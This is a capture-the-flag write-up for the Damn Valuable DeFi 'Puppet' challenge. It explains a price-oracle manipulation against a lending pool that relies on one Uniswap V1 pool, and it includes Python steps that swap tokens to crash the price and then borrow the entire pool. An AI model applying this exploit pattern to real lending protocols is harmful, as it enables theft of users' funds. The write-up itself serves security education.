## Puppet

### Challenge description

> There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
>
> There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.
>
> Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.

### Solution

For this challenge there's a huge vulnerability in the PuppetPool contract where it only computes the price of the token from one source, the Uniswap V1 pool of DVT/ETH tokens.

If there's only one price source, the source can be easily manipulated, as we have 100 times more tokens than the Uniswap V1 pool, thus allowing us to push the price way down, to the point where it's possible to drain almost all the ETH in the uniswap pool.

To solve the challenge, first we have to approve the tokens for trade on the Uniswap V1 pool of DVT/ETH tokens:

```python
token.approve(
    uniswap_exchange.address, 
    2**256 - 1, 
    _fromAttacker
)
```

Here I used a pseudo-infinite approval (usually just called infinite approvals in DeFi), though this is not really necessary.

Then drain the pool of as much ETH as we can get in order to push the price of DVT tokens to as low as we can get it:

```python
uniswap_exchange.tokenToEthSwapOutput(
    ether_to_wei(9.9), 
    ether_to_wei(1000), 
    web3.eth.get_block('latest').timestamp * 2, 
    _fromAttacker
)
```

Then calculate the required deposit of ETH in order to borrow *all* the tokens in the lending pool by calling `calculateDepositRequired()`:

```python
deposit_required = lending_pool.calculateDepositRequired(ether_to_wei(100000))
```

And finally, borrow all the tokens sending the value required assigned to the `deposit_required` variable:

```python
lending_pool.borrow(
    ether_to_wei(100000), 
    _fromAttacker | value_dict(deposit_required)
) 
```

This will effectively take all the tokens in the lending pool.
